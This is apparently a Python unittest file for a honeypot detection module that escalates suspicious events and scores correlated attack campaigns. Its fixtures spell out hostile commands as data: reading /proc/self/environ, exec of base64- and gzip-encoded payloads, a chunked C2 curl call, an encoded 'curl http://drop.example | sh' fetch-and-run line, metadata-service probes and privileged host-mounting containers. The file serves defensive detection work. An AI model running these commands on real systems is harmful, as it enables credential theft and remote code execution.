#!/usr/bin/env python3
"""Tests for criticality_rules.py (#154 phase 3).

Three groups:

1. Unit tests per rule against hand-built fixtures.
2. The full-corpus proof: every one of the 27 real corpus events, run
   through evaluate_event(), must escalate exactly when that event's own
   expected_findings.should_escalate says it should -- corpus.jsonl used
   here strictly as the test oracle (see criticality_rules.py's own module
   docstring for why that direction matters).
3. campaign_severity() tests, including the real capstone case: the merged
   8-event campaign (corpus-015 through corpus-023, via
   campaign_correlator.py) should reach "critical", not just "high",
   because it trips 5+ distinct rule categories -- the actual point of
   correlating before scoring.
"""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import campaign_correlator as camp  # noqa: E402
import criticality_rules as cr  # noqa: E402
import validate_corpus  # noqa: E402


class TestIndividualRules(unittest.TestCase):
    def test_sensitive_path_read_matches_proc_environ(self):
        raw = {"eventid": "cowrie.command.input", "input": "cat /proc/self/environ"}
        self.assertIsNotNone(cr.rule_sensitive_path_read(raw))

    def test_sensitive_path_read_ignores_unrelated_command(self):
        raw = {"eventid": "cowrie.command.input", "input": "ls -la /tmp"}
        self.assertIsNone(cr.rule_sensitive_path_read(raw))

    def test_sensitive_path_read_ignores_non_cowrie_sensor(self):
        # A dashboard-audit event that happens to mention the same path in
        # an unrelated field shouldn't match -- _cowrie_input only reads
        # "input" when eventid starts with "cowrie.".
        raw = {"event": "note", "input": "/proc/self/environ"}
        self.assertIsNone(cr.rule_sensitive_path_read(raw))

    def test_chunked_c2_protocol_matches(self):
        raw = {"input": "curl -d 'type=stage&channel=ab12&seq=1&chk=x&data=AAAAAAAA'"}
        match = cr.rule_chunked_c2_protocol(raw)
        self.assertIsNotNone(match)
        self.assertIn("channel=ab12", match.reason)

    def test_encoded_execution_requires_both_exec_and_verified_decode(self):
        import base64
        import gzip
        blob = base64.b64encode(gzip.compress(b"id")).decode()
        raw = {"eventid": "cowrie.command.input", "input": f"python3 -c \"exec(gzip.decompress(base64.b64decode('{blob}')))\""}
        self.assertIsNotNone(cr.rule_encoded_execution(raw))

    def test_encoded_execution_ignores_exec_without_decodable_payload(self):
        raw = {"eventid": "cowrie.command.input", "input": "exec('id')"}
        self.assertIsNone(cr.rule_encoded_execution(raw))

    def test_encoded_execution_populates_decode_chain(self):
        # #154 phase 5's own "decoded-artifact hashes" requirement -- a
        # verified decode must leave a real, checkable hash chain behind,
        # not just the human-readable reason string.
        import base64
        import gzip
        blob = base64.b64encode(gzip.compress(b"id")).decode()
        raw = {"eventid": "cowrie.command.input", "input": f"python3 -c \"exec(gzip.decompress(base64.b64decode('{blob}')))\""}
        match = cr.rule_encoded_execution(raw)
        self.assertTrue(match.decode_chain)
        self.assertEqual(match.decode_chain[0].transform, "base64")
        # bounded_decode keeps peeling as long as something peels off (its
        # own documented behavior, see decode_correlate.py) -- b"id" itself
        # happens to be valid base64, so the chain runs past the gzip step
        # rather than stopping there. Assert the gzip step is present
        # somewhere, not that it's necessarily last.
        self.assertIn("gzip", [step.transform for step in match.decode_chain])
        self.assertEqual(len(match.decode_chain[-1].output_sha256), 64)

    def test_encoded_egress_external_populates_decode_chain(self):
        # Payload decodes to b"hello world!" -- the space/exclamation stop
        # bounded_decode's iterative peeling at this layer (b"helloworld"
        # alone would itself be valid base64 and get peeled into noise,
        # correctly failing the verified-decode bar).
        raw = {"src_ip": "10.0.0.5", "dest_ip": "8.8.8.8", "payload_printable": "GET /x?data=aGVsbG8gd29ybGQh HTTP/1.1"}
        match = cr.rule_encoded_egress_external(raw)
        self.assertIsNotNone(match)
        self.assertEqual(len(match.decode_chain), 1)
        # #2087: the chain records a transform that really ran -- base64 of
        # b"hello world!" -- not an identity "raw" step over alphabet-matched
        # text.
        self.assertEqual(match.decode_chain[0].transform, "base64")
        self.assertEqual(len(match.decode_chain[0].output_sha256), 64)

    def test_encoded_egress_external_ignores_jwt_shaped_token(self):
        """#2087's demonstration case: a JWT segment toward an external host
        is alphabet-matching but not encoded -- bounded_decode itself
        refuses it, so the rule must not escalate on it."""
        raw = {
            "src_ip": "192.0.2.60",
            "dest_ip": "198.51.100.9",
            "payload_printable": "POST /api upload token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9xQ trailing words",
        }
        self.assertIsNone(cr.rule_encoded_egress_external(raw))

    def test_encoded_egress_external_ignores_long_hex_hash(self):
        raw = {"src_ip": "192.0.2.60", "dest_ip": "198.51.100.9", "payload_printable": "sha256=" + "a" * 64 + " done"}
        self.assertIsNone(cr.rule_encoded_egress_external(raw))

    def test_encoded_egress_external_still_fires_on_base64_of_text(self):
        import base64 as _b64
        encoded = _b64.b64encode(b"curl http://drop.example | sh").decode()
        raw = {"src_ip": "192.0.2.60", "dest_ip": "198.51.100.9", "payload_printable": f"data={encoded} end"}
        match = cr.rule_encoded_egress_external(raw)
        self.assertIsNotNone(match)
        self.assertIn("base64", [step.transform for step in match.decode_chain])

    def test_every_encoded_egress_match_records_a_real_transform(self):
        """#2087 acceptance criterion: no match may carry an identity/raw
        decode step -- provenance shown to operators must never claim a
        decode that didn't happen."""
        import base64 as _b64
        events = [
            {"src_ip": "192.0.2.60", "dest_ip": "198.51.100.9", "payload_printable": f"data={_b64.b64encode(b'exfil text').decode()}"},
            {"src_ip": "192.0.2.50", "dest_ip": "198.51.100.53", "dns": {"rrname": "pmrgcy3dn52w45c7nfsceor.corpus-example.test"}},
        ]
        for raw in events:
            match = cr.rule_encoded_egress_external(raw)
            if match is not None:
                self.assertTrue(match.decode_chain)
                for step in match.decode_chain:
                    self.assertNotEqual(step.transform, "raw")

    def test_metadata_service_probe_matches_link_local_address(self):
        raw = {"dest_ip": "169.254.169.254"}
        self.assertIsNotNone(cr.rule_metadata_service_probe(raw))

    def test_privileged_container_create_matches(self):
        raw = {"event": "container_create", "flags": ["--privileged", "-v", "/:/host"]}
        self.assertIsNotNone(cr.rule_privileged_container_create(raw))

    def test_privileged_container_create_ignores_unprivileged(self):
        raw = {"event": "container_create", "flags": ["--rm"]}
        self.assertIsNone(cr.rule_privileged_container_create(raw))

    def test_broad_scope_identity_token_matches_admin_scope_unnamed_actor(self):
        raw = {"event": "token_mint_attempt", "requested_scope": "cluster-admin", "requested_ttl_hours": 24, "actor": "unknown"}
        self.assertIsNotNone(cr.rule_broad_scope_identity_token(raw))

    def test_broad_scope_identity_token_ignores_narrow_named_request(self):
        raw = {"event": "token_mint", "requested_scope": "introspection", "requested_ttl_hours": 1, "actor": "admin"}
        self.assertIsNone(cr.rule_broad_scope_identity_token(raw))

    def test_broad_scope_identity_token_ignores_admin_scope_from_named_actor(self):
        # A named, legitimate operator requesting a broad scope isn't
        # itself suspicious -- the actor check is what matters, same
        # reasoning as rule_scm_write_unexpected_actor.
        raw = {"event": "token_mint", "requested_scope": "admin", "requested_ttl_hours": 1, "actor": "admin"}
        self.assertIsNone(cr.rule_broad_scope_identity_token(raw))

    def test_covert_mesh_enrollment_matches_process_args(self):
        raw = {"process_args": ["--state=mem:", "--no-logs-no-support"]}
        self.assertIsNotNone(cr.rule_covert_mesh_enrollment(raw))

    def test_covert_mesh_enrollment_matches_alert_signature(self):
        raw = {"alert": {"signature": "LOCAL Mesh-VPN Client Enrollment (unexpected source)"}}
        self.assertIsNotNone(cr.rule_covert_mesh_enrollment(raw))

    def test_internal_connector_enumeration_matches_unnamed_actor(self):
        raw = {"event": "api_request", "endpoint": "/internal/connectors/catalog", "actor": "unknown"}
        self.assertIsNotNone(cr.rule_internal_connector_enumeration(raw))

    def test_scm_write_unexpected_actor_matches_token_mint(self):
        raw = {"event": "github_app_token_mint", "actor": "unknown"}
        self.assertIsNotNone(cr.rule_scm_write_unexpected_actor(raw))

    def test_scm_write_unexpected_actor_ignores_dependabot(self):
        raw = {"event": "pull_request_opened", "actor": "dependabot[bot]", "triggers_workflow": True}
        self.assertIsNone(cr.rule_scm_write_unexpected_actor(raw))

    def test_staged_payload_reference_matches(self):
        raw = {"eventid": "cowrie.command.input", "input": "ls -la /tmp/staged; hostname"}
        self.assertIsNotNone(cr.rule_staged_payload_reference(raw))

    def test_evaluate_event_returns_every_match_not_just_first(self):
        # A command that's both a sensitive-path read *and* references the
        # staging directory should trip both rules.
        raw = {"eventid": "cowrie.command.input", "input": "cat /proc/self/environ > /tmp/staged/out"}
        matches = cr.evaluate_event(raw)
        rule_names = {m.rule for m in matches}
        self.assertIn("sensitive-path-read", rule_names)
        self.assertIn("staged-payload-reference", rule_names)


class TestSameSegment(unittest.TestCase):
    """Regression coverage for a real bug found while proving this module
    against the corpus: ipaddress.ip_address(...).is_private returns True
    for RFC 5737 TEST-NET ranges too, which broke both directions at once
    (external TEST-NET traffic misread as internal, so the egress rule
    never fired; then, after switching to a strict RFC1918-only check,
    same-segment TEST-NET traffic misread as external instead, so a
    benign fixture started false-positiving). The same-/24 check this
    settled on fixes both without depending on which address range -- real
    RFC1918 or corpus TEST-NET -- is in play."""

    def test_same_24_is_internal(self):
        self.assertTrue(cr._same_segment("192.0.2.60", "192.0.2.61"))

    def test_different_24_is_external(self):
        self.assertFalse(cr._same_segment("192.0.2.50", "198.51.100.53"))

    def test_real_rfc1918_same_segment_still_works(self):
        self.assertTrue(cr._same_segment("10.1.2.3", "10.1.2.4"))

    def test_loopback_destination_is_always_internal(self):
        self.assertTrue(cr._same_segment("192.0.2.50", "127.0.0.1"))

    def test_link_local_destination_is_always_internal(self):
        # Deliberately NOT the metadata-service special case
        # (169.254.169.254 is separately escalated by
        # rule_metadata_service_probe) -- this just confirms link-local in
        # general isn't treated as a foreign network segment.
        self.assertTrue(cr._same_segment("192.0.2.50", "169.254.1.1"))


class TestFullCorpusMatchesGroundTruth(unittest.TestCase):
    """The actual proof this module works: every one of the 27 real
    corpus events, evaluated by structure alone, escalates exactly when
    its own expected_findings.should_escalate (ground truth, established
    independently when the corpus was built) says it should."""

    @classmethod
    def setUpClass(cls):
        cls.events = validate_corpus.load_corpus()

    def test_every_event_matches_its_own_ground_truth(self):
        mismatches = []
        for e in self.events:
            matches = cr.evaluate_event(e["raw"])
            predicted = len(matches) > 0
            actual = e["expected_findings"]["should_escalate"]
            if predicted != actual:
                mismatches.append((e["event_id"], predicted, actual, [m.rule for m in matches]))
        self.assertEqual(mismatches, [], f"{len(mismatches)} event(s) disagree with their own ground truth")

    def test_no_benign_event_ever_matches_a_rule(self):
        # Stronger than the aggregate check above: specifically confirms
        # zero rules fire on any is_benign=true event, not just that the
        # overall true/false verdict happens to line up.
        for e in self.events:
            if e["is_benign"]:
                matches = cr.evaluate_event(e["raw"])
                self.assertEqual(matches, [], f"{e['event_id']} is benign but matched: {[m.rule for m in matches]}")

    def test_every_non_benign_event_matches_at_least_one_rule(self):
        for e in self.events:
            if not e["is_benign"] and e["expected_findings"]["should_escalate"]:
                matches = cr.evaluate_event(e["raw"])
                self.assertGreater(len(matches), 0, f"{e['event_id']} should escalate but matched nothing")


class TestCampaignSeverity(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.events = validate_corpus.load_corpus()
        cls.by_id = {e["event_id"]: e for e in cls.events}
        cls.campaigns = camp.correlate_campaigns(cls.events)

    def _matches_for_campaign(self, campaign):
        return {eid: cr.evaluate_event(self.by_id[eid]["raw"]) for eid in campaign.event_ids}

    def _campaign_containing(self, event_id):
        for c in self.campaigns:
            if event_id in c.event_ids:
                return c
        self.fail(f"{event_id} not in any campaign")

    def test_low_severity_for_pure_recon(self):
        matches = cr.campaign_severity({"e1": [], "e2": []})
        self.assertEqual(matches[0], "low")

    def test_high_severity_for_one_category(self):
        matches = {"e1": [cr.RuleMatch("sensitive-path-read", "x")]}
        self.assertEqual(cr.campaign_severity(matches)[0], "high")

    def test_critical_severity_for_three_or_more_categories(self):
        matches = {
            "e1": [cr.RuleMatch("sensitive-path-read", "x")],
            "e2": [cr.RuleMatch("metadata-service-probe", "x")],
            "e3": [cr.RuleMatch("covert-mesh-enrollment", "x")],
        }
        self.assertEqual(cr.campaign_severity(matches)[0], "critical")

    def test_repeated_category_does_not_inflate_severity(self):
        # Two events both tripping the same rule is one category, not two
        # -- must not reach "critical" on repetition alone.
        matches = {
            "e1": [cr.RuleMatch("sensitive-path-read", "x")],
            "e2": [cr.RuleMatch("sensitive-path-read", "y")],
        }
        severity, categories = cr.campaign_severity(matches)
        self.assertEqual(severity, "high")
        self.assertEqual(categories, {"sensitive-path-read"})

    def test_merged_campaign_reaches_critical(self):
        # The real capstone: the 8-event campaign
        # campaign_correlator.py's own tests already prove is one campaign
        # (bridged via the shared C2 channel) should independently reach
        # "critical" once scored -- this is the actual point of
        # correlating before scoring, not a coincidence of this specific
        # fixture.
        campaign = self._campaign_containing("corpus-017")
        self.assertGreaterEqual(len(campaign.event_ids), 8)
        severity, categories = cr.campaign_severity(self._matches_for_campaign(campaign))
        self.assertEqual(severity, "critical")
        self.assertGreaterEqual(len(categories), 3)

    def test_session_001_chain_reaches_high_not_critical(self):
        # corpus-001/002/010/011/013/014: only two distinct rule
        # categories fire across this whole chain (sensitive-path-read,
        # encoded-execution) -- "high", not "critical", is the correct,
        # honest verdict for this particular fixture chain, since it
        # doesn't show the same further escalation the merged campaign
        # above does.
        campaign = self._campaign_containing("corpus-001")
        severity, categories = cr.campaign_severity(self._matches_for_campaign(campaign))
        self.assertEqual(severity, "high")
        self.assertLess(len(categories), 3)


class TestBreadcrumbFollowed(unittest.TestCase):
    def test_reference_alone_does_not_match_followed(self):
        # Reading /etc/hosts (or internal-services.txt) that happens to
        # mention "bastion02" is a reference, not a followed breadcrumb --
        # the attacker never actually shows up on beelzebub.
        events_by_id = {
            "e1": {"raw": {"eventid": "cowrie.command.input", "input": "cat internal-services.txt", "sensor": "cowrie"}},
        }
        matches = {"e1": cr.evaluate_event(events_by_id["e1"]["raw"])}
        self.assertIsNone(cr.campaign_breadcrumb_followed(["e1"], events_by_id, matches))

    def test_reference_then_reaching_target_sensor_matches(self):
        events_by_id = {
            "e1": {"raw": {"eventid": "cowrie.command.input", "input": "ssh bastion02", "sensor": "cowrie"}},
            "e2": {"raw": {"sensor": "beelzebub", "src_ip": "203.0.113.9"}},
        }
        matches = {eid: cr.evaluate_event(events_by_id[eid]["raw"]) for eid in ("e1", "e2")}
        result = cr.campaign_breadcrumb_followed(["e1", "e2"], events_by_id, matches)
        self.assertIsNotNone(result)
        eid, match = result
        self.assertEqual(eid, "e2")  # attached to the later, "reached it" event
        self.assertEqual(match.rule, "breadcrumb-followed")

    def test_reaching_target_before_reference_does_not_match(self):
        # Order matters: hitting beelzebub BEFORE ever reading the
        # breadcrumb is unrelated activity, not evidence of following it.
        events_by_id = {
            "e1": {"raw": {"sensor": "beelzebub", "src_ip": "203.0.113.9"}},
            "e2": {"raw": {"eventid": "cowrie.command.input", "input": "ssh bastion02", "sensor": "cowrie"}},
        }
        matches = {eid: cr.evaluate_event(events_by_id[eid]["raw"]) for eid in ("e1", "e2")}
        self.assertIsNone(cr.campaign_breadcrumb_followed(["e1", "e2"], events_by_id, matches))

    def test_wrong_target_sensor_does_not_match(self):
        # Referenced "dc01" points at beelzebub, not elasticpot -- showing
        # up on elasticpot afterward is unrelated, not a followed
        # breadcrumb for THIS reference.
        events_by_id = {
            "e1": {"raw": {"eventid": "cowrie.command.input", "input": "cat /etc/hosts | grep dc01", "sensor": "cowrie"}},
            "e2": {"raw": {"sensor": "elasticpot", "src_ip": "203.0.113.9"}},
        }
        matches = {eid: cr.evaluate_event(events_by_id[eid]["raw"]) for eid in ("e1", "e2")}
        self.assertIsNone(cr.campaign_breadcrumb_followed(["e1", "e2"], events_by_id, matches))


if __name__ == "__main__":
    unittest.main()
